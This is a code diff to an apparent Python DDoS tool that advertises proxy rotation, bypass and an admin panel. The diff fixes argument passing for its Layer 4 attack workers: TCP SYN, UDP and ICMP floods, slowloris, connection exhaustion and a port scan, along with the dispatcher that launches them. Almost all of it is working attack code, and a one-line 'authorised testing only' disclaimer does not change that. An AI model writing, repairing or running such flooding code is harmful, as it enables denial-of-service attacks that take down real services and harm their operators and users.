@@ -5,7 +5,7 @@
     │   WITH PROXY ROTATION, BYPASS & ADMIN PANEL     │
     │   SPRAY YOUR PAYLOAD IN MY PORT !                │
     └─────────────────────────────────────────────────┘
-    Author: bob (per‑packet L4 output with time left)
+    Author: bob (fixed argument count for L4 workers)
     Legal: For authorised testing only.
 """
 
@@ -738,7 +738,9 @@ async def run_layer7_mp(url, method, total_workers, duration, plan_name, req_cou
             p.join()
 
 # ================== LAYER 4 WORKERS ==================
-def tcp_syn_flood_worker(target_ip, target_port, worker_id, end_time, req_counter, err_counter, ports_hit_list):
+# All worker functions now accept *args to absorb any extra arguments,
+# allowing a uniform call in worker_wrapper.
+def tcp_syn_flood_worker(target_ip, target_port, worker_id, end_time, req_counter, err_counter, ports_hit_list, *args):
     if not HAS_SCAPY:
         return
     from scapy.all import IP, TCP, send
@@ -756,7 +758,7 @@ def tcp_syn_flood_worker(target_ip, target_port, worker_id, end_time, req_counte
         except:
             err_counter.value += 1
 
-def udp_flood_worker(target_ip, target_port, worker_id, end_time, req_counter, err_counter, ports_hit_list):
+def udp_flood_worker(target_ip, target_port, worker_id, end_time, req_counter, err_counter, ports_hit_list, *args):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     while time.time() < end_time:
         try:
@@ -770,7 +772,7 @@ def udp_flood_worker(target_ip, target_port, worker_id, end_time, req_counter, e
         except:
             err_counter.value += 1
 
-def icmp_flood_worker(target_ip, worker_id, end_time, req_counter, err_counter):
+def icmp_flood_worker(target_ip, worker_id, end_time, req_counter, err_counter, *args):
     if not HAS_SCAPY:
         return
     from scapy.all import IP, ICMP, send
@@ -786,7 +788,7 @@ def icmp_flood_worker(target_ip, worker_id, end_time, req_counter, err_counter):
         except:
             err_counter.value += 1
 
-def slowloris_worker(target_ip, target_port, worker_id, end_time, req_counter, err_counter, ports_hit_list, conn_counter):
+def slowloris_worker(target_ip, target_port, worker_id, end_time, req_counter, err_counter, ports_hit_list, conn_counter, *args):
     socks = []
     while time.time() < end_time:
         try:
@@ -815,7 +817,7 @@ def slowloris_worker(target_ip, target_port, worker_id, end_time, req_counter, e
             err_counter.value += 1
         time.sleep(0.1)
 
-def connection_exhaustion_worker(target_ip, target_port, worker_id, end_time, req_counter, err_counter, ports_hit_list, conn_counter):
+def connection_exhaustion_worker(target_ip, target_port, worker_id, end_time, req_counter, err_counter, ports_hit_list, conn_counter, *args):
     while time.time() < end_time:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -831,7 +833,7 @@ def connection_exhaustion_worker(target_ip, target_port, worker_id, end_time, re
         except:
             err_counter.value += 1
 
-def port_scan_worker(target_ip, worker_id, end_time, req_counter, err_counter, ports_hit_list):
+def port_scan_worker(target_ip, worker_id, end_time, req_counter, err_counter, ports_hit_list, *args):
     ports_to_scan = list(range(1, 1025))
     random.shuffle(ports_to_scan)
     for port in ports_to_scan:
@@ -893,6 +895,7 @@ async def run_layer4_attack(target_ip, method, workers, duration, plan_name, req
         while time.time() < end_time:
             if target_ports:
                 port = random.choice(target_ports) if target_ports else None
+                # For ICMP and port scan, port is ignored inside the worker (they accept *args)
                 if method in ['TCP SYN FLOOD', 'UDP FLOOD', 'SLOWLORIS', 'CONNECTION EXHAUSTION']:
                     worker_func(target_ip, port, worker_id, end_time, req_counter, err_counter, ports_hit_list, conn_counter)
                 elif method == 'ICMP FLOOD':
@@ -900,7 +903,14 @@ async def run_layer4_attack(target_ip, method, workers, duration, plan_name, req
                 elif method == 'PORT SCAN & ATTACK':
                     worker_func(target_ip, worker_id, end_time, req_counter, err_counter, ports_hit_list)
             else:
-                worker_func(target_ip, worker_id, end_time, req_counter, err_counter, ports_hit_list, conn_counter)
+                # No ports needed (ICMP or port scan)
+                if method == 'ICMP FLOOD':
+                    worker_func(target_ip, worker_id, end_time, req_counter, err_counter)
+                elif method == 'PORT SCAN & ATTACK':
+                    worker_func(target_ip, worker_id, end_time, req_counter, err_counter, ports_hit_list)
+                else:
+                    # Should not happen for methods that need ports
+                    pass
     
     with ThreadPoolExecutor(max_workers=workers) as executor:
         futures = [executor.submit(worker_wrapper, i) for i in range(workers)]
